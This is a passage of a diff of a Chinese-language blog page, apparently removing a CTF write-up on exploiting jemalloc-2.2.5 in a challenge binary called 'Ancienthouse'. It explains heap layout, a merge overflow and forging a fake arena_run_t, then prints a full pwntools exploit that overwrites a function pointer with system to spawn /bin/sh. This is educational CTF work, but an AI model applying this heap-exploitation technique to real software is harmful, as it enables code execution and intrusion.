class="number">2</span>)</span><br></pre></td></tr></table></figure>
-<p><strong>入侵思路</strong></p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> p_fun = <span class="built_in">malloc</span>(<span class="number">0x50</span>uLL);</span><br><span class="line"> *p_fun = str_fun;</span><br><span class="line"></span><br><span class="line">.......</span><br><span class="line"></span><br><span class="line"> ((<span class="keyword">void</span> (__fastcall *)(_QWORD))*p_fun)(p_fun[<span class="number">1</span>]);</span><br><span class="line"> <span class="built_in">exit</span>(<span class="number">1</span>);</span><br></pre></td></tr></table></figure>
-<ul>
-<li>选择“4”会执行一次函数指针 p_fun，我们的目的就是覆盖它为 system（本程序是有 system 的）</li>
-</ul>
-<p>对于 jemalloc-2.2.5 有一些特点：</p>
-<ul>
-<li>malloc 分配的数据是连续的，jemalloc-2.2.5 用偏移来获取 region 的位置</li>
-</ul>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* jemalloc-2.2.5/src/arena.c */</span></span><br><span class="line">ret = (<span class="keyword">void</span> *)((<span class="keyword">uintptr_t</span>)run + (<span class="keyword">uintptr_t</span>)bin_info-&gt;reg0_offset +</span><br><span class="line">    (<span class="keyword">uintptr_t</span>)(bin_info-&gt;reg_size * regind));</span><br></pre></td></tr></table></figure>
-<ul>
-<li>region 的值可以理解为“3”部分相加：<ul>
-<li>run：对应 run 的基地址</li>
-<li>bin_info-&gt;reg0_offset：此 bin 对应的 run 中第一个 region 的偏移量</li>
-<li>bin_info-&gt;reg_size * regind：目标 region 在 run 中的偏移量</li>
-</ul>
-</li>
-<li>在 jemalloc 分配 region 前，会在目标 run 的范围的头部申请一个 arena_run_t 结构体来管理 run</li>
-<li>每一个 run 占用的地址空间有一定的规律：</li>
-</ul>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x10</span>, <span class="string">&#x27;0&#x27;</span> * <span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">&#x27;1&#x27;</span> * <span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">0x30</span>, <span class="string">&#x27;2&#x27;</span> * <span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">0x40</span>, <span class="string">&#x27;3&#x27;</span> * <span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">0x50</span>, <span class="string">&#x27;4&#x27;</span> * <span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">&#x27;5&#x27;</span> * <span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">0x70</span>, <span class="string">&#x27;6&#x27;</span> * <span class="number">0x10</span>)</span><br></pre></td></tr></table></figure>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x55a84742a040</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x55a84742a040</span> —▸ <span class="number">0x7f0d6300a040</span> —▸ <span class="number">0x7f0d63006050</span> ◂— <span class="string">&#x27;0000000000000000&#x27;</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x55a84742a048</span> —▸ <span class="number">0x7f0d6300a060</span> —▸ <span class="number">0x7f0d6300a080</span> ◂— <span class="string">&#x27;1111111111111111&#x27;</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x55a84742a050</span> —▸ <span class="number">0x7f0d6300a0a0</span> —▸ <span class="number">0x7f0d6300b040</span> ◂— <span class="string">&#x27;2222222222222222&#x27;</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x55a84742a058</span> —▸ <span class="number">0x7f0d6300a0c0</span> —▸ <span class="number">0x7f0d63007080</span> ◂— <span class="string">&#x27;3333333333333333&#x27;</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x55a84742a060</span> —▸ <span class="number">0x7f0d6300a0e0</span> —▸ <span class="number">0x7f0d630080b0</span> ◂— <span class="string">&#x27;4444444444444444&#x27;</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│  <span class="number">0x55a84742a068</span> —▸ <span class="number">0x7f0d6300a100</span> —▸ <span class="number">0x7f0d6300c080</span> ◂— <span class="string">&#x27;5555555555555555&#x27;</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│  <span class="number">0x55a84742a070</span> —▸ <span class="number">0x7f0d6300a120</span> —▸ <span class="number">0x7f0d6300e080</span> ◂— <span class="string">&#x27;6666666666666666&#x27;</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│  <span class="number">0x55a84742a078</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
-<ul>
-<li>不管重复多少次后5位始终不变，说明 jemalloc 的分配以 100page 为单位</li>
-<li>而 p_fun 是用 malloc(0x50) 分配的，它所在地址为“0x8000”</li>
-</ul>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7f8a8c808000</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7f8a8c808000</span> ◂— <span class="number">0x384adf93</span> <span class="comment">/* arena_run_t[0x50] */</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x7f8a8c808008</span> —▸ <span class="number">0x7f8a8d000d70</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x7f8a8c808010</span> ◂— <span class="number">0x3000000002</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x7f8a8c808018</span> ◂— <span class="number">0x3fffffffffffc</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x7f8a8c808020</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓     <span class="number">3</span> skipped</span><br><span class="line"><span class="number">08</span>:<span class="number">0040</span>│  <span class="number">0x7f8a8c808040</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓     <span class="number">3</span> skipped</span><br><span class="line"><span class="number">0</span>c:<span class="number">0060</span>│  <span class="number">0x7f8a8c808060</span> —▸ <span class="number">0x563e3dadfb82</span> ◂— endbr64 <span class="comment">/* p_fun */</span></span><br><span class="line"><span class="number">0</span>d:<span class="number">0068</span>│  <span class="number">0x7f8a8c808068</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓     <span class="number">2</span> skipped</span><br><span class="line"><span class="number">10</span>:<span class="number">0080</span>│  <span class="number">0x7f8a8c808080</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓     <span class="number">5</span> skipped</span><br><span class="line"><span class="number">16</span>:<span class="number">00b</span>0│  <span class="number">0x7f8a8c8080b0</span> ◂— <span class="string">&#x27;4444444444444444&#x27;</span></span><br><span class="line"><span class="number">17</span>:<span class="number">00b</span>8│  <span class="number">0x7f8a8c8080b8</span> ◂— <span class="string">&#x27;44444444&#x27;</span></span><br></pre></td></tr></table></figure>
-<ul>
-<li>因为 p_fun 是 run[0x50] 的第一个 region，申请的 region[0x50] 不可能向上覆盖，所以只能考虑申请 0x40 的 region（因为离得最近）</li>
-<li>可以利用堆溢出来修改控制 arena_run_t[0x50] 结构体</li>
-</ul>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">arena_run_s</span> <span class="title">arena_run_t</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">arena_run_s</span> &#123;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> JEMALLOC_DEBUG</span></span><br><span class="line">	<span class="keyword">uint32_t</span>	magic;</span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> ARENA_RUN_MAGIC 0x384adf93</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">arena_bin_t</span>	*bin; <span class="comment">/* 与此run关联的bin */</span></span><br><span class="line">	<span class="keyword">uint32_t</span>	nextind; <span class="comment">/* 下一个从未分配过的区域或nregs的索引 */</span></span><br><span class="line">	<span class="keyword">unsigned</span>	nfree; <span class="comment">/* run中的空闲区域数 */</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 本次运行中区域的位掩码,每个位对应一个区域,&#x27;0&#x27;表示该区域已使用,&#x27;1&#x27;位值表示相应区域空闲,变量nextind是该数组的第一个非零元素的索引 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> regs_mask[];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
-<ul>
-<li>我们需要修改的就是这个 arena_run_s-&gt;nfree</li>
-</ul>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p (<span class="keyword">arena_run_t</span>)*<span class="number">0x7fc184808000</span></span><br><span class="line">$<span class="number">1</span> = &#123;</span><br><span class="line">  magic = <span class="number">944430995</span>,</span><br><span class="line">  bin = <span class="number">0x7fc185000d70</span>,</span><br><span class="line">  nextind = <span class="number">1</span>,</span><br><span class="line">  nfree = <span class="number">49</span> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<ul>
-<li>把 nfree 改为50，其他条目都不变</li>
-<li>如果 nfree 为初始值，jemalloc 就会认为该 run 没有进行分配，下一次分配就会覆盖 p_fun（这里不是很清楚原因，可能要在源码中找依据）</li>
-</ul>
-<p>堆溢出 <code>merge</code> 有3个条件：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( index1 == index2 || size1 != size2 || size1 + size2 &gt; <span class="number">0x5F</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Dont try anything funny &quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<ul>
-<li>index 不相同，size 相同，size1 + size2 &gt; 0x5F</li>
-<li>好像就只能使用两个 0x20 进行 <code>merge</code> 了</li>
-</ul>
-<p>还有一个关键点：malloc 分配的数据是连续的</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *__fastcall <span class="title">merge_name</span><span class="params">(<span class="keyword">char</span> *name1, <span class="keyword">char</span> *name2, <span class="keyword">unsigned</span> __int64 size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 i; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">size_t</span> len; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  len = <span class="built_in">strlen</span>(name1);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0LL</span>; i &lt; size; ++i )</span><br><span class="line">    name1[i + len] = name2[i];</span><br><span class="line">  name1[i + len] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> name1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<ul>
-<li>“size”为“0x60”（size1+size2+size2）</li>
-<li>name2 的后半部分必须是 fake arena_run_t[0x50]</li>
-</ul>
-<p><strong>堆风水的构建</strong></p>
-<p>首先，name 必须连续，用两个连续的 name 来充当 name2，这里我参考了学长的思路：</p>
-<ul>
-<li>正常释放时，内存排列为：chunkF-nameF-chunkF-nameF-chunkF-nameF </li>
-<li>使用 malloc(0x60) 打乱内存的排列：chunk-nameF-chunkF-nameF-chunkF-nameF </li>
-<li>然后继续 malloc(0x20) 两次：chunk-chunk-name-chunk-name-nameF </li>
-<li>原本 name 的位置被写入了 chunk，原本 chunk 的位置被写入了 name，最后的 name-nameF 满足了 name 连续的条件</li>
-<li>所以，可以在最后一个 nameF 中装入 fake arena_run_t[0x50]</li>
-</ul>
-<p>完整 exp：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./Ancienthouse&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./Ancienthouse&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,name</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Enter the size : &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Enter name : &quot;</span>,name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">battle</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Enter enemy id : &quot;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">merge</span>(<span class="params">id1,id2</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;[+] Enemy id 1: &quot;</span>,<span class="built_in">str</span>(id1))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;[+] Enemy id 2: &quot;</span>,<span class="built_in">str</span>(id2))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">kill</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">		battle(<span class="built_in">id</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun</span>():</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&quot;yhellow&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">battle(-<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Starting battle with &quot;</span>)</span><br><span class="line">leak_addr = u64(p.recvuntil(<span class="string">&quot; ....&quot;</span>)[:-<span class="number">5</span>].ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">pro_base = leak_addr-<span class="number">0x4008</span></span><br><span class="line"></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;pro_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(pro_base))</span><br><span class="line">success(<span class="string">&quot;chunk_list &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(pro_base+<span class="number">0x4040</span>))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;You beat &#x27;em!\n&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">&#x27;1&#x27;</span> * <span class="number">0x20</span>) <span class="comment"># 0 </span></span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">&#x27;2&#x27;</span> * <span class="number">0x20</span>) <span class="comment"># 1</span></span><br><span class="line"></span><br><span class="line">kill(<span class="number">0</span>)</span><br><span class="line">kill(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">&#x27;&#x27;</span>) <span class="comment"># 2</span></span><br><span class="line">battle(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Starting battle with &quot;</span>)</span><br><span class="line">leak_addr = u64(p.recvuntil(<span class="string">&quot; ....&quot;</span>)[:-<span class="number">5</span>].ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">heap_base = leak_addr - <span class="number">0xb00a</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;heap_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">	battle(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;You beat &#x27;em!\n&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">61</span>):</span><br><span class="line">	add(<span class="number">0x40</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">0x40</span>) <span class="comment"># 3-63</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">&#x27;/bin/sh\x00&#x27;</span>) <span class="comment"># 64</span></span><br><span class="line">binsh = heap_base + <span class="number">0xa800</span> </span><br><span class="line">payload = p64(<span class="number">0x384adf93</span>)+p64(heap_base+<span class="number">0x800d70</span>)+p64(<span class="number">0x0000003200000001</span>)+p64(<span class="number">0x0003ffffffffffff</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">&#x27;1&#x27;</span> * <span class="number">0x20</span>) <span class="comment"># 65 </span></span><br><span class="line">add(<span class="number">0x20</span>, payload) <span class="comment"># 66 </span></span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">&#x27;3&#x27;</span> * <span class="number">0x20</span>) <span class="comment"># 67</span></span><br><span class="line">kill(<span class="number">65</span>)</span><br><span class="line">kill(<span class="number">66</span>)</span><br><span class="line"><span class="comment"># chunkF-nameF-chunkF-nameF(t)</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x70</span>, <span class="string">&#x27;k&#x27;</span> * <span class="number">0x60</span>) <span class="comment"># 68</span></span><br><span class="line"><span class="comment"># (chunk)-nameF-chunkF-nameF(t)</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">&#x27;1&#x27;</span> * <span class="number">0x20</span>) <span class="comment"># 69 </span></span><br><span class="line"><span class="comment"># chunk-(chunk-name)-nameF(t)</span></span><br><span class="line"></span><br><span class="line">merge(<span class="number">67</span>, <span class="number">69</span>)</span><br><span class="line"></span><br><span class="line">system = pro_base + <span class="number">0x1170</span></span><br><span class="line">paylaod = p64(system) + p64(binsh)</span><br><span class="line">add(<span class="number">0x50</span>, paylaod) <span class="comment"># p_func</span></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-<hr>
-<p><strong>小结：</strong></p>
-<p>jemalloc 对于 small part 的分配已经比较清楚了，但有些细节没有对照源码来看，只是记了结论</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -2677,7 +2629,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">221</span>
+          <span class="site-state-item-count">222</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -2690,7 +2642,7 @@
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">134</span>
+        <span class="site-state-item-count">135</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
@@ -2731,7 +2683,7 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="Reading time total">44:08</span>
+    <span title="Reading time total">44:22</span>
 </div>
   <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
   </div>
